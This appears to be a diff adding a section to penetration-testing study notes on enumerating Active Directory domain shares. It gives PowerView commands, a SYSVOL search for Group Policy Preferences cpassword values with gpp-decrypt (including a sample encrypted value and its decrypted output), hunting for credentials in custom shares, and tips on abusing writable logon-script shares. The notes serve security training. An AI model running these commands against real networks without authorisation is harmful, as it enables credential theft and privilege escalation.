@@ -1730,3 +1730,300 @@ Get-ObjectAcl -Identity "<target>" | ? {$_.SecurityIdentifier -notmatch "S-1-5-3
 Object permission enumeration reveals critical security misconfigurations and provides direct paths for privilege escalation through ACL abuse and permission manipulation.
 
 ---
+
+## Enumerating Domain Shares
+
+Domain shares often contain critical organizational intelligence, including sensitive documents, configuration files, legacy policies, and credentials. Thorough share enumeration reveals data repositories that may contain privilege escalation paths and operational intelligence.
+
+### Domain Share Discovery with PowerView
+
+**Basic Share Enumeration:**
+```powershell
+# Discover all domain shares
+Find-DomainShare
+
+# Filter for accessible shares only
+Find-DomainShare -CheckShareAccess
+
+# Target specific computer
+Find-DomainShare -ComputerName <hostname>
+```
+
+**Share Type Analysis:**
+- **Type 0**: Standard file shares (user-created)
+- **Type 2147483648**: Administrative shares (C$, ADMIN$)
+- **Type 2147483651**: IPC shares (Inter-Process Communication)
+
+### Critical Default Domain Shares
+
+**Domain Controller Shares:**
+- **SYSVOL**: Group Policy templates, logon scripts, domain policies
+- **NETLOGON**: Domain logon scripts and authentication files
+- **ADMIN$**: Administrative access to system root
+- **C$**: Administrative access to C: drive
+- **IPC$**: Inter-Process Communication endpoint
+
+**SYSVOL Share Significance:**
+- Contains Group Policy Preferences (GPP) files
+- Stores domain-wide script repositories
+- Houses policy configuration archives
+- Accessible to all domain users by default
+- Located at `%SystemRoot%\SYSVOL\Sysvol\domain-name`
+
+### Systematic Share Investigation
+
+**SYSVOL Enumeration Example:**
+```powershell
+# List SYSVOL contents
+ls \\<domain_controller>\sysvol\<domain_name>\
+
+# Common SYSVOL structure:
+# ├── Policies\
+# ├── scripts\
+# └── Archives (if present)
+```
+
+**Sample SYSVOL Contents:**
+```
+Directory: \\DC1.corp.com\sysvol\corp.com
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:11 AM                Policies
+d-----          9/2/2022   4:08 PM                scripts
+```
+
+**Policies Directory Investigation:**
+```powershell
+# Enumerate policy folders
+ls \\<domain_controller>\sysvol\<domain_name>\Policies\
+
+# Common findings:
+# - GUIDs representing Group Policy Objects
+# - Legacy policy backups
+# - Administrative configuration files
+```
+
+### Group Policy Preferences (GPP) Password Extraction
+
+**GPP Vulnerability Background:**
+- Legacy method for managing local account passwords
+- AES-256 encrypted passwords stored in policy files
+- Microsoft published decryption key on MSDN
+- Affects cpassword attributes in policy XML files
+
+**GPP Password Discovery:**
+```powershell
+# Search for policy files with encrypted passwords
+findstr /S /I cpassword \\<domain_controller>\sysvol\<domain_name>\Policies\*.xml
+
+# Manual file inspection
+cat \\<domain_controller>\sysvol\<domain_name>\Policies\<policy_folder>\*.xml
+```
+
+**Sample GPP Password File:**
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+        name="Administrator (built-in)"
+        cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+        userName="Administrator (built-in)" />
+</Groups>
+```
+
+**GPP Password Decryption:**
+```bash
+# Using gpp-decrypt (Kali Linux)
+gpp-decrypt "<encrypted_password>"
+
+# Example:
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+# Output: P@$$w0rd
+```
+
+**Alternative Decryption Tools:**
+- **Get-GPPPassword** (PowerShell)
+- **gpp-decrypt** (Ruby script)
+- **GPP-Decrypt** (Python implementations)
+- **Metasploit GPP modules**
+
+### Custom Share Enumeration and Analysis
+
+**Non-Default Share Investigation:**
+```powershell
+# Target interesting custom shares
+ls \\<target_server>\<custom_share>
+
+# Common naming patterns to investigate:
+# - backup, backups
+# - docs, documentation, docshare
+# - share, sharing, shared
+# - files, data
+# - temp, temporary
+# - archive, old
+```
+
+**Deep Directory Traversal:**
+```powershell
+# Recursive directory listing
+Get-ChildItem \\<server>\<share> -Recurse
+
+# Search for specific file types
+Get-ChildItem \\<server>\<share> -Recurse -Include *.txt,*.doc,*.xlsx,*.pdf
+```
+
+### Credential and Intelligence Discovery
+
+**Common Sensitive File Locations:**
+- **Configuration Files**: web.config, app.config, settings files
+- **Documentation**: README files, installation guides, admin notes
+- **Scripts**: PowerShell scripts, batch files, deployment scripts
+- **Backups**: Database dumps, configuration backups, user exports
+
+**Password Pattern Analysis:**
+From discovered credentials, analyze organizational password policies:
+- **Complexity Requirements**: Character types, length patterns
+- **Naming Conventions**: Seasonal patterns, company references
+- **Account Types**: Service accounts, administrative accounts
+- **Age Indicators**: Password change frequency, legacy credentials
+
+**Sample Credential Discovery:**
+```
+Email content revealing:
+Username: jeff
+Password: HenchmanPutridBonbon11
+Context: New hire temporary password
+```
+
+### Share Enumeration Workflow
+
+```mermaid
+flowchart TD
+    Start["Domain Share Enum"] --> Discovery["Find-DomainShare"]
+    Discovery --> DefaultShares["Default Shares"]
+    Discovery --> CustomShares["Custom Shares"]
+    
+    DefaultShares --> SYSVOL["SYSVOL Analysis"]
+    DefaultShares --> NETLOGON["NETLOGON Scripts"]
+    DefaultShares --> AdminShares["ADMIN$/C$ Access"]
+    
+    CustomShares --> DocShares["Documentation"]
+    CustomShares --> BackupShares["Backup Repositories"]
+    CustomShares --> TempShares["Temporary Storage"]
+    
+    SYSVOL --> GPP["GPP Password Hunt"]
+    SYSVOL --> Policies["Policy Analysis"]
+    
+    GPP --> Decrypt["gpp-decrypt"]
+    DocShares --> FileEnum["File Enumeration"]
+    BackupShares --> ConfigFiles["Config File Review"]
+    
+    Decrypt --> Creds["Credential Extraction"]
+    FileEnum --> Intel["Intelligence Gathering"]
+    ConfigFiles --> Passwords["Password Discovery"]
+    
+    Creds --> Analysis["Pattern Analysis"]
+    Intel --> Analysis
+    Passwords --> Analysis
+    
+    Analysis --> Wordlists["Custom Wordlists"]
+    Analysis --> TargetAccounts["Account Targeting"]
+    
+    style Start fill:#e1f5fe
+    style GPP fill:#ff6b6b
+    style Creds fill:#c8e6c9
+    style Analysis fill:#fff3e0
+```
+
+### Strategic Share Analysis
+
+**High-Value Target Identification:**
+1. **SYSVOL**: Always investigate for GPP passwords and policies
+2. **Custom Documentation Shares**: Often contain organizational intelligence
+3. **Backup Shares**: May contain configuration files and credential exports
+4. **Administrative Tool Shares**: Script repositories and deployment tools
+
+**Intelligence Extraction Priorities:**
+- **Credentials**: Plaintext or encrypted passwords
+- **Network Architecture**: Server names, IP ranges, service configurations
+- **Organizational Structure**: User roles, department mappings, contact information
+- **Security Policies**: Password requirements, account policies, access controls
+
+### Share Access Verification
+
+**Testing Share Permissions:**
+```powershell
+# Test read access
+Test-Path \\<server>\<share>
+
+# List accessible shares for current user
+Find-DomainShare -CheckShareAccess
+
+# Test specific file access
+Get-Content \\<server>\<share>\<file>
+```
+
+**Permission Escalation via Shares:**
+- **Write Access**: Upload malicious files, modify scripts
+- **Administrative Shares**: C$, ADMIN$ access indicates local admin rights
+- **Script Directories**: NETLOGON write access enables logon script modification
+
+### Documentation and Intelligence Management
+
+**Systematic Documentation:**
+- **Share Inventory**: Complete list with access levels
+- **Credential Repository**: Discovered passwords with context
+- **File Catalog**: Important documents and their locations
+- **Pattern Analysis**: Password policies and naming conventions
+
+**Operational Intelligence:**
+- **Network Mapping**: Server roles and relationships
+- **User Behavior**: Access patterns and file usage
+- **Security Posture**: Policy enforcement and monitoring gaps
+- **Attack Vectors**: Identified privilege escalation paths
+
+### Share Enumeration Commands Reference
+
+**PowerView Share Commands:**
+```powershell
+# Basic share discovery
+Find-DomainShare
+
+# Accessible shares only
+Find-DomainShare -CheckShareAccess
+
+# Target specific hosts
+Find-DomainShare -ComputerName <hostname>
+
+# Domain controller focus
+Find-DomainShare -ComputerName <domain_controller>
+```
+
+**Manual Share Analysis:**
+```powershell
+# Directory listing
+ls \\<server>\<share>
+
+# Recursive enumeration
+Get-ChildItem \\<server>\<share> -Recurse
+
+# File content inspection
+cat \\<server>\<share>\<file>
+
+# File type filtering
+Get-ChildItem \\<server>\<share> -Include *.xml,*.txt,*.config -Recurse
+```
+
+**GPP Password Hunting:**
+```bash
+# Search for GPP passwords in SYSVOL
+findstr /S /I cpassword \\<domain_controller>\sysvol\<domain>\Policies\*.xml
+
+# Decrypt discovered passwords
+gpp-decrypt "<encrypted_password>"
+```
+
+Domain share enumeration provides critical intelligence gathering opportunities, revealing organizational credentials, configuration details, and sensitive documentation that enables both immediate exploitation and strategic attack planning.
+
+---
